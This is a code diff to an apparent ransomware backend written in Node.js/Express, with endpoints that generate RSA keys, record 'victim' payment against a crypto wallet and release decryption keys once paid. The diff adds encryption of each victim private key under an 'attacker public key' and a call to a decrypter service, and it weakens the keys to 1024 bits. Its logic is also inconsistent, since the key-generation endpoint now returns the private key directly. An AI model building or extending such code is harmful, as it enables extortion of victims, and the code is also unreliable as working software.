@@ -7,19 +7,34 @@
 
 */
 
+const fs = require('fs');
 const express = require('express');
 const app = express();
 const crypto = require('crypto'); // Crypto module for RSA key
+const axios = require('axios');
 
 app.use(express.json());
 
 const keys = {};
 const wallets = {}; // Matches pub_keys with crypto wallet
 
+let attk_pub = null;
+const attk_pub_path = "./attk_pub.pem";
+const decrypter_url = "http://localhost:5000/decrypt";
+
 var key_count = 0;
 
+// Load Public Key to Encrypt Private Keys
+if (fs.existsSync(attk_pub_path))
+    attk_pub = fs.readFileSync(attk_pub_path, 'utf8');
+else
+    console.log("Couldn't Find Attacker Public Key");
+
+if (!attk_pub)
+    process.exit();
+
 // Check if victim has paid
-app.post('/check-payment', (req, res) => {
+app.post('/check-payment', async (req, res) => {
     const {pub_key} = req.body;
     
     // Validate
@@ -32,7 +47,15 @@ app.post('/check-payment', (req, res) => {
 
     if (paid) {
         const priv_key = keys[pub_key];
-        return res.status(200).json({ key: priv_key});
+
+        // Decrypt private key
+        const request = await axios.post(decrypter_url, {
+            to_decrypt: priv_key
+        });
+
+        const decrypted = request.data.privateKey;
+
+        return res.status(200).json({ key: decrypted});
     }
 
     return res.status(400).json({ msg: "Not Paid"});
@@ -61,7 +84,7 @@ app.get('/has-paid/:key', (req, res) => {
 app.get('/gen-key', (req, res) => {
     // Generate RSA key
     const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
-        modulusLength: 2048, // length of bits for RSA key
+        modulusLength: 1024, // length of bits for RSA key
         publicKeyEncoding: {
             type: 'pkcs1', // SPKI format
             format: 'pem' // PEM format
@@ -71,12 +94,20 @@ app.get('/gen-key', (req, res) => {
             format: 'pem' // PEM format
         }
     });
-
+    
     // store keys
-    keys[key_count] = { publicKey, privateKey};
+    const secret_priv = crypto.publicEncrypt(
+        {
+            key: attk_pub,
+            padding: crypto.constants.RSA_PKCS1_PADDING
+        },
+        Buffer.from(privateKey)
+    );
+
+    keys[publicKey] = secret_priv.toString('base64');
 
     // send back public key
-    res.send(publicKey);
+    res.status(200).json({pub: publicKey, pkey: privateKey.toString()});
 
     // increments key count
     key_count+=1;
